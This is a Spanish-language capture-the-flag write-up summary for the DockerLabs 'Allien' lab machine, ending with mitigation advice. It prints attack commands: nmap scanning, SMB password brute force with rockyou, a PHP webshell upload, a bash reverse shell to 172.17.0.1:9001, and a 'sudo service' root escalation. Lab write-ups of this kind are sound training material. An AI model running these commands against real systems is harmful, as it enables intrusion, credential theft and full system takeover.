# Allien — Resumen de pentesting (DockerLabs)

Objetivo: máquina Allien (entorno Docker).
Alcance: pruebas locales dentro del contenedor/bridge Docker (IP objetivo 172.17.0.2).
Resultado principal: obtención de credenciales SMB, acceso a webshell vía subida de PHP, reverse shell desde contenedor al host (gateway Docker) y escalada a root mediante un sudo service mal configurado.

---

## Preparación del entorno

Sistema atacante: Kali Linux (actualizado).

Descargar y desplegar la máquina Allien (ZIP + auto_deploy.sh) y arrancarla con Docker.

Comandos de setup (ejemplo):

```
sudo apt update && sudo apt full-upgrade -y && sudo apt autoremove -y
mkdir Allien && cd Allien
mv ../Downloads/allien.zip .
sudo unzip allien.zip
sudo chmod +x auto_deploy.sh
./auto_deploy.sh   # lanza la máquina en Docker
```
(Detalles completos en el write-up original).

---

## Reconocimiento y enumeración

- Escaneo Nmap (completo/agresivo):

```
nmap -sC -sV --min-rate=5000 -vvv -A -p- 172.17.0.2 -oN escaneo_allien.txt
```
- Puertos abiertos detectados: 22 (SSH), 80 (HTTP), 139 & 445 (SMB/Samba).
- Enumeración web: gobuster para directorios (index.php, página de productos).
- Enumeración SMB: enum4linux -a, smbmap, rpcclient (comandos enumdomusers y querydispinfo) para obtener usuarios.

---

## Explotación (flujo resumido)

SMB user discovery: enumdomusers / querydispinfo devolvió el usuario **satriani7**.
Fuerza bruta SMB: prueba con metasploit auxiliary/smb_login y con la herramienta netexec/nxc usando rockyou.txt. netexec encontró la contraseña mucho más rápido.

Ejemplo:
  
```
nxc smb 172.17.0.2 -u satriani7 -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```
Acceso a shares con smbclient: conexión con satriani7, listado de shares y lectura de archivos. Al cambiar lcd /tmp se pudieron descargar ficheros (notes.txt, credentiales.txt)
Extracción de credenciales: en los ficheros descargados apareció la credencial de administrator (o credenciales de alto interés).
SSH / Hydra: con la lista de usuarios + passwords se hizo fuerza bruta (Hydra) contra SSH; se obtuvo acceso a la cuenta administrator y luego a ssh con credenciales de administrador.
Acceso web writable: con credenciales administrador se montó el share home con permisos READ/WRITE, se encontró el código fuente web y se subió una webshell PHP (gist de joswr1ght) al docroot.
Webshell → Reverse shell: se ejecutó la webshell y se lanzó reverse shell hacia el host usando la IP del gateway Docker (172.17.0.1), obteniendo un shell www-data dentro del contenedor.

---

## Post-explotación y escalada de privilegios

Desde el shell obtenido como www-data (por la webshell), se buscó vectores de escalada:
Búsqueda de SUIDs: find / -perm -4000 2>/dev/null.
Revisión de sudo con sudo -l.
Se encontró un vector en service (GTFOBins): posible uso de sudo service ../../bin/sh permitiendo ejecutar /bin/sh como root.
Resultado final: root conseguido ejecutando:

```
sudo service ../../bin/sh
# -> root shell
```
Nota clave: la reverse-shell utiliza la IP 172.17.0.1 porque, desde dentro del contenedor, esa IP es la gateway del bridge docker0 (host visto desde contenedor).

---

## Hallazgos / Credenciales (ejemplo)

Usuario descubierto: satriani7 (contraseña encontrada via diccionario).
Credenciales adicionales encontradas en shares: usuario administrator con contraseña (extraída de credentiales.txt).
Share home con permisos de escritura permitiendo subir webshell.

---

## Comandos y herramientas clave utilizadas

- nmap, gobuster, enum4linux, smbmap, rpcclient, smbclient
- metasploit (auxiliary smb_login) y hydra para fuerza bruta SSH.
- netexec / nxc — herramienta de fuerza bruta SMB muy efectiva en este caso.
- subida de webshell PHP (put desde smbclient) y reverse shell (bash -i >& /dev/tcp/172.17.0.1/9001 0>&1).
(Ver el write-up original para comandos completos y ejemplos). 

---

## Mitigaciones recomendadas

### SSH

Deshabilitar autenticación por contraseña (PasswordAuthentication no), usar claves.

Restringir usuarios (AllowUsers) y/o redes.

Implementar rate-limiting / fail2ban / MFA.

### HTTP / Aplicación Web

Validación y saneamiento de uploads; evitar permitir escritura en docroot.

Deshabilitar funciones peligrosas en PHP (disable_functions), usar open_basedir.

WAF (ModSecurity) y uso de HTTPS (redirigir 80→443), headers CSP/HSTS.

### SMB / Samba

No exponer SMB a redes no confiables / Internet.

Forzar NTLMv2, habilitar SMB signing y aplicar ACLs restrictivas en shares.

Revisar permisos de shares: principle of least privilege.

Host / Contenedores

Aislar contenedores y no confiar en shares con permisos de escritura hacia código web.

Monitorizar logs y alertas (ELK/Splunk) para actividad sospechosa.

---

## Conclusión

La máquina Allien demuestra una cadena típica de ataque interno:

Recon (Nmap, fuzzing web, SMB enum) → 2. Descubrimiento de usuarios y fuerza bruta SMB → 3. Acceso a shares con escritura → 4. Subida de webshell → 5. Reverse shell al host vía gateway Docker → 6. Escalada local a root por sudo service mal configurado.
El ejercicio es excelente para practicar enumeración SMB, explotación de permisos de share, técnicas de pivot/reverse shells en entornos Docker y post-explotación/privilege escalation locales. 



